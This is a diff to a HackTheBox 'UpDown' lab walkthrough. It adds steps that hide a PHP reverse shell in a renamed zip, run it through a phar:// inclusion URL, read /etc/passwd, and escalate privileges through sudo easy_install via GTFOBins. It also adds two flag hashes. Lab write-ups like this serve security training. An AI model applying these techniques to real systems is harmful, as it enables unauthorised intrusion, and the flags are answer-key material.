@@ -1,4 +1,4 @@
-### 2024-04-21-Sun
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/31f4dd61-f10a-4b92-87af-4b87a23f6923)### 2024-04-21-Sun
 
 [UpDown | HackTheBox](https://app.hackthebox.com/machines/UpDown)
 
@@ -162,3 +162,67 @@ echo "<?php phpinfo(); ?>" > info.php
 ```
 
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/20e38da3-3fd2-44b5-985a-5b2099a0b106)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/db0739c0-fdeb-4a70-ab7f-9b987345132d)
+
+```
+zip rev.zip rev.php
+mv rev.zip rev.txt
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/290b5b9a-4f7f-4bb2-ba95-2c8b97f7b980)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fbf8fde7-78e6-4344-bfd1-69dbfa297cea)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c2efd06c-55d4-46da-b8f6-bea68fef8f20)
+
+http://dev.siteisup.htb/?page=phar://uploads/0c7b9a04adf7c378d59a2975c90826f4/rev.txt/rev
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9566a673-3f72-41f8-9bfb-9f9e0657915b)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a6542c6b-9e23-4800-9f3b-005c999d3349)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/31e10159-3b5f-44eb-80ed-2ba316b045c4)
+
+```
+import requests
+
+url = input("Enter URL here:")
+page = requests.get(url)
+if page.status_code == 200:
+        print "Website is up"
+else:
+        print "Website is down"
+```
+
+```
+cat /etc/passwd | grep -v -e false -e nologin -e sync
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/89f49cef-eeb1-4339-ae79-de67cf1ec5bf)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/25330d11-318c-4d9b-b2c9-2b09215f6400)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b49f7be6-7834-4059-b58c-a4566ae20150)
+
+```
+edebe49b03026e348c81e3bc1e962ede
+```
+
+```
+sudo -l
+```
+
+/usr/local/bin/easy_install
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/08977505-ec55-4318-a15e-318dfd4c69c6)
+
+https://gtfobins.github.io/easy_install
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/287258a3-c881-4d44-b32b-75b6528ccd3e)
+
+```
+f019569e0d9073f2d1512c89a8c0c7bf
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c673f38d-c623-4114-95ae-c5df34b1b81d)
